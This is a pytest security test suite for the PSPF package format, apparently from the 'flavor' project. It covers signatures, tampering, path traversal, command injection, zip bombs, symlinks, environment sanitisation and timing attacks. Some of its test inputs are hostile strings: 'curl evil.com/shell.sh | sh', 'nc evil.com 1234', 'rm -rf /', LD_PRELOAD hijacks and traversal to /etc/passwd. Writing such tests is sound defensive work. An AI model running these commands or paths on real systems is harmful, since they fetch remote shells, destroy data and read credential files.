"""
Security tests for PSPF package handling.

These tests ensure packages cannot be tampered with or exploited.
"""

import os
import tempfile
import hashlib
from pathlib import Path
import pytest

from flavor.psp.format_2025 import PSPFBuilder, PSPFReader
from flavor.packaging.keys import generate_ephemeral_keys


class TestPackageSecurity:
    """Test package security features."""
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test environment."""
        self.temp_dir = Path(tempfile.mkdtemp())
        yield
        # Cleanup
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_signature_verification_required(self):
        """Ensure packages cannot run without valid signature."""
        # Create a package without signature
        package_path = self.temp_dir / "unsigned.pspf"
        builder = PSPFBuilder()
        
        # Build without signing
        # This should fail in production mode
        with pytest.raises(Exception, match="signature.*required"):
            builder.build_unsigned(package_path)  # Should not be possible
    
    def test_tampered_package_detection(self):
        """Ensure tampered packages are detected."""
        # Create a valid signed package
        package_path = self.temp_dir / "signed.pspf"
        private_key, public_key = generate_ephemeral_keys()
        
        builder = PSPFBuilder()
        builder.set_keys(private_key, public_key)
        builder.build(package_path)
        
        # Tamper with the package
        with open(package_path, 'rb') as f:
            data = f.read()
        
        # Modify a byte in the middle
        tampered_data = data[:1000] + b'X' + data[1001:]
        
        with open(package_path, 'wb') as f:
            f.write(tampered_data)
        
        # Try to read tampered package
        reader = PSPFReader(package_path)
        with pytest.raises(Exception, match="integrity.*fail|signature.*invalid"):
            reader.verify_integrity_seal()
    
    def test_path_traversal_prevention(self):
        """Ensure path traversal attacks are prevented."""
        test_cases = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "slots/../../../sensitive",
            "//etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
        ]
        
        for malicious_path in test_cases:
            with pytest.raises(Exception, match="invalid.*path|traversal"):
                # Attempt to create slot with malicious path
                builder = PSPFBuilder()
                builder.add_slot(malicious_path, b"malicious")
    
    def test_command_injection_prevention(self):
        """Ensure command injection is prevented."""
        test_cases = [
            "test; rm -rf /",
            "test && curl evil.com/shell.sh | sh",
            "test`whoami`",
            "test$(whoami)",
            "test|nc evil.com 1234",
            "test\n/bin/sh",
        ]
        
        for malicious_input in test_cases:
            # Ensure malicious commands in metadata are sanitized
            builder = PSPFBuilder()
            with pytest.raises(Exception, match="invalid.*character|command"):
                builder.set_metadata({
                    "execution": {
                        "command": malicious_input
                    }
                })
    
    def test_zip_bomb_prevention(self):
        """Ensure zip bombs are detected and prevented."""
        # Create a highly compressed file that expands enormously
        small_data = b"A" * 1024  # 1KB
        
        # Compress it claiming it's huge
        builder = PSPFBuilder()
        
        # Try to create a slot with mismatched size
        with pytest.raises(Exception, match="size.*mismatch|decompression.*bomb"):
            builder.add_compressed_slot(
                name="bomb",
                compressed_data=small_data,
                uncompressed_size=10 * 1024 * 1024 * 1024  # Claims 10GB
            )
    
    def test_memory_exhaustion_prevention(self):
        """Ensure memory exhaustion attacks are prevented."""
        # Try to allocate huge amounts of memory
        builder = PSPFBuilder()
        
        # Attempt to create absurdly large slot
        with pytest.raises(Exception, match="too.*large|memory|size.*limit"):
            builder.add_slot(
                name="huge",
                data=b"A",
                claimed_size=100 * 1024 * 1024 * 1024  # 100GB
            )
    
    def test_symlink_escape_prevention(self):
        """Ensure symlinks cannot escape package sandbox."""
        # Create a package with symlink
        link_path = self.temp_dir / "evil_link"
        link_path.symlink_to("/etc/passwd")
        
        builder = PSPFBuilder()
        with pytest.raises(Exception, match="symlink.*not.*allowed|forbidden"):
            builder.add_file(link_path)
    
    def test_race_condition_prevention(self):
        """Ensure race conditions during extraction are handled."""
        import threading
        import time
        
        package_path = self.temp_dir / "race.pspf"
        extract_dir = self.temp_dir / "extract"
        
        # Create package
        builder = PSPFBuilder()
        builder.add_slot("test", b"data")
        builder.build(package_path)
        
        # Try concurrent extraction
        results = []
        def extract():
            try:
                reader = PSPFReader(package_path)
                reader.extract_all(extract_dir)
                results.append("success")
            except Exception as e:
                results.append(str(e))
        
        threads = [threading.Thread(target=extract) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        
        # Should have proper locking - only one success
        assert results.count("success") == 1
    
    def test_environment_variable_sanitization(self):
        """Ensure environment variables are properly sanitized."""
        dangerous_vars = {
            "LD_PRELOAD": "/tmp/evil.so",
            "PYTHONPATH": "/tmp/evil",
            "PATH": "/tmp/evil:$PATH",
            "IFS": "/",
            "PS4": "$(whoami)",
        }
        
        builder = PSPFBuilder()
        
        for var, value in dangerous_vars.items():
            with pytest.raises(Exception, match="forbidden.*variable|invalid.*env"):
                builder.set_runtime_env({"set": {var: value}})
    
    def test_resource_limits_enforcement(self):
        """Ensure resource limits are enforced."""
        # Test file count limit
        builder = PSPFBuilder()
        
        # Try to add too many files
        with pytest.raises(Exception, match="too.*many.*files|limit"):
            for i in range(100000):
                builder.add_slot(f"file_{i}", b"data")
    
    def test_deterministic_builds(self):
        """Ensure builds are deterministic for verification."""
        # Build same package twice
        builder1 = PSPFBuilder()
        builder1.add_slot("test", b"data")
        builder1.set_reproducible(True)
        package1 = self.temp_dir / "package1.pspf"
        builder1.build(package1)
        
        builder2 = PSPFBuilder()
        builder2.add_slot("test", b"data")
        builder2.set_reproducible(True)
        package2 = self.temp_dir / "package2.pspf"
        builder2.build(package2)
        
        # Should produce identical packages
        hash1 = hashlib.sha256(package1.read_bytes()).hexdigest()
        hash2 = hashlib.sha256(package2.read_bytes()).hexdigest()
        assert hash1 == hash2, "Builds are not deterministic"
    
    def test_permission_preservation(self):
        """Ensure file permissions are not escalated."""
        # Create file with restricted permissions
        restricted_file = self.temp_dir / "restricted"
        restricted_file.write_text("secret")
        os.chmod(restricted_file, 0o600)  # Owner read/write only
        
        builder = PSPFBuilder()
        builder.add_file(restricted_file)
        package_path = self.temp_dir / "perms.pspf"
        builder.build(package_path)
        
        # Extract and check permissions
        extract_dir = self.temp_dir / "extract"
        reader = PSPFReader(package_path)
        reader.extract_all(extract_dir)
        
        extracted = extract_dir / "restricted"
        stat = os.stat(extracted)
        # Should not have escalated permissions
        assert stat.st_mode & 0o777 <= 0o600, "Permissions were escalated"


class TestCryptographicSecurity:
    """Test cryptographic security features."""
    
    def test_key_strength(self):
        """Ensure keys meet minimum strength requirements."""
        private_key, public_key = generate_ephemeral_keys()
        
        # Ed25519 keys should be 32 bytes
        assert len(public_key) == 32
        assert len(private_key) == 64  # 32 byte key + 32 byte public
    
    def test_signature_algorithm(self):
        """Ensure proper signature algorithm is used."""
        # Should use Ed25519, not RSA or ECDSA
        from flavor.crypto import SIGNATURE_ALGORITHM
        assert SIGNATURE_ALGORITHM == "Ed25519"
    
    def test_random_seed_quality(self):
        """Ensure random seeds are cryptographically secure."""
        seeds = set()
        for _ in range(100):
            _, public_key = generate_ephemeral_keys()
            seeds.add(public_key)
        
        # All keys should be unique
        assert len(seeds) == 100, "Random seed generation is not secure"
    
    def test_timing_attack_resistance(self):
        """Ensure signature verification is timing-attack resistant."""
        import time
        
        package_path = Path("test.pspf")
        reader = PSPFReader(package_path)
        
        # Time verification with correct vs incorrect signatures
        correct_times = []
        incorrect_times = []
        
        for _ in range(100):
            start = time.perf_counter_ns()
            try:
                reader.verify_integrity_seal()
            except:
                pass
            elapsed = time.perf_counter_ns() - start
            correct_times.append(elapsed)
        
        # Modify signature
        reader._signature = b"wrong" * 16
        
        for _ in range(100):
            start = time.perf_counter_ns()
            try:
                reader.verify_integrity_seal()
            except:
                pass
            elapsed = time.perf_counter_ns() - start
            incorrect_times.append(elapsed)
        
        # Times should be statistically similar (constant-time comparison)
        import statistics
        correct_mean = statistics.mean(correct_times)
        incorrect_mean = statistics.mean(incorrect_times)
        
        # Should be within 10% (constant time)
        ratio = correct_mean / incorrect_mean
        assert 0.9 < ratio < 1.1, "Timing attack vulnerability detected"